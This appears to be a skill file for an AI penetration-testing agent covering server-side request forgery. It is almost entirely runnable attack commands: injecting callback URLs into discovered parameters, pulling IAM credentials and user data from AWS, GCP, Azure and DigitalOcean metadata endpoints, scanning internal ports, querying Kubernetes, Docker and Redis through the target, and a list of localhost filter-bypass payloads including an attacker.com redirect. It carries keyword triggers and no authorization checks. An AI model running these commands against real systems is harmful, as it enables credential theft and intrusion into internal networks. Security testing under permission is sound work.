---
name: vuln-ssrf
description: "Server-Side Request Forgery (SSRF) testing — cloud metadata exfiltration, internal service pivoting, blind SSRF via OOB callbacks, protocol abuse (Gopher/dict/file), DNS rebinding, SSRF filter bypass. Triggers: 'ssrf', 'server side request forgery', 'cloud metadata', 'aws imds', '169.254.169.254', 'internal service access', 'webhook ssrf', 'blind ssrf', 'url fetch', 'gopher protocol', 'dns rebinding ssrf'."
---

# Server-Side Request Forgery (SSRF)

Leverage server as proxy to reach internal networks, cloud metadata, and restricted services.

---

## Phase 1: Surface Discovery

```bash
TARGET="https://TARGET"

# Find SSRF candidate parameters:
curl -s "$TARGET" | grep -oE '(url|link|fetch|src|href|redirect|uri|endpoint|webhook|proxy|avatar|image|logo|feed|api|callback|host|dest|goto|site|html|target|path|file|open|load|data|reference|resource|source|ping|report|payload|service)=[^&"'\'' ]+' | head -40

# Historical URLs with potential SSRF params:
gau "$TARGET" 2>/dev/null | grep -E '(url|link|fetch|src|redirect|uri|webhook|proxy|avatar|image|callback|host|dest|goto|load|data|reference|resource|source)=' | sort -u | tee output/ssrf_candidates.txt

# Grab JS for API fetch patterns:
curl -s "$TARGET/" | grep -oE '"(https?://[^"]+)"' | grep -v 'cdn\|analytics\|tracking'
```

---

## Phase 2: OOB Detection (Blind SSRF)

```bash
# Start a collaborator / interactsh listener:
interactsh-client -v 2>&1 | tee output/interactsh.log &
INTERACTSH_HOST="$(interactsh-client -v 2>&1 | grep 'https://' | head -1 | awk '{print $NF}')"

# Also use Burp Collaborator hostname if available
COLLAB="YOUR_BURP_COLLAB_HOSTNAME"

# Inject OOB payload into SSRF candidate params:
for URL in $(cat output/ssrf_candidates.txt); do
  curl -s "${URL//=*/=http://$COLLAB}" -o /dev/null &
  curl -s "${URL//=*/=http://$INTERACTSH_HOST}" -o /dev/null &
done
wait

# Check interactsh for DNS/HTTP callbacks:
cat output/interactsh.log | grep -E 'dns|http'
```

---

## Phase 3: Cloud Metadata Exfiltration

```bash
TARGET_URL="https://TARGET"
PARAM="url"  # adjust to actual param name

# AWS IMDSv1:
curl -s "$TARGET_URL?${PARAM}=http://169.254.169.254/latest/meta-data/"
curl -s "$TARGET_URL?${PARAM}=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "$TARGET_URL?${PARAM}=http://169.254.169.254/latest/user-data"

# AWS IMDSv2 (token first):
curl -s "$TARGET_URL?${PARAM}=http://169.254.169.254/latest/api/token" \
  -H "X-Forwarded-For: 169.254.169.254"

# GCP metadata:
curl -s "$TARGET_URL?${PARAM}=http://metadata.google.internal/computeMetadata/v1/instance/" \
  -H "Metadata-Flavor: Google"
curl -s "$TARGET_URL?${PARAM}=http://metadata.google.internal/computeMetadata/v1/project/project-id" \
  -H "Metadata-Flavor: Google"

# Azure metadata:
curl -s "$TARGET_URL?${PARAM}=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata: true"

# Digital Ocean:
curl -s "$TARGET_URL?${PARAM}=http://169.254.169.254/metadata/v1.json"
```

---

## Phase 4: Internal Service Discovery

```bash
TARGET_URL="https://TARGET"
PARAM="url"

# Common internal ports:
for PORT in 22 25 80 443 8080 8443 3000 3306 5432 6379 27017 9200 9300 10250 2375 4567; do
  RESP=$(curl -s -o /dev/null -w "%{http_code}:%{time_connect}" \
    "$TARGET_URL?${PARAM}=http://127.0.0.1:${PORT}" 2>/dev/null)
  echo "Port $PORT: $RESP"
done | tee output/ssrf_internal_ports.txt

# Kubernetes API server:
curl -s "$TARGET_URL?${PARAM}=https://10.96.0.1:443/api/v1/namespaces"
curl -s "$TARGET_URL?${PARAM}=https://kubernetes.default.svc/api/v1/pods"

# Docker API:
curl -s "$TARGET_URL?${PARAM}=http://172.17.0.1:2375/v1.41/containers/json"

# Redis (via Gopher):
curl -s "$TARGET_URL?${PARAM}=gopher://127.0.0.1:6379/_PING%0D%0A"

# Elasticsearch:
curl -s "$TARGET_URL?${PARAM}=http://127.0.0.1:9200/_cat/indices"
```

---

## Phase 5: SSRF Filter Bypass

```bash
TARGET_URL="https://TARGET"
PARAM="url"

# IP encoding variants (target: 127.0.0.1):
BYPASSES=(
  "http://127.0.0.1/"
  "http://localhost/"
  "http://[::1]/"
  "http://0/"
  "http://0.0.0.0/"
  "http://2130706433/"        # decimal
  "http://0x7f000001/"        # hex
  "http://0177.0.0.1/"        # octal
  "http://127.1/"
  "http://127.0.1/"
  "http://[0:0:0:0:0:ffff:127.0.0.1]/"
  "http://①②⑦.0.0.1/"        # unicode
  "http://spoofed.127.0.0.1.nip.io/"  # DNS
)

for bypass in "${BYPASSES[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL?${PARAM}=${bypass}")
  echo "$bypass → $STATUS"
done | tee output/ssrf_bypass.txt

# URL redirect trick:
# Host an open redirect at attacker.com/r?u=http://169.254.169.254/...
curl -s "$TARGET_URL?${PARAM}=https://attacker.com/r?u=http://169.254.169.254/latest/meta-data/"

# DNS rebinding:
# Use https://lock.cmpxchg8b.com/rebinder.html to create a rebind domain
```

---

## Output

Save to `output/`:
- `ssrf_candidates.txt` — SSRF-injectable parameter URLs
- `ssrf_internal_ports.txt` — Internal port scan results
- `ssrf_bypass.txt` — Filter bypass attempts and results

## Next Phase

→ `vuln-rce` if SSRF reaches internal metadata or services
→ `pentest-report` to document findings
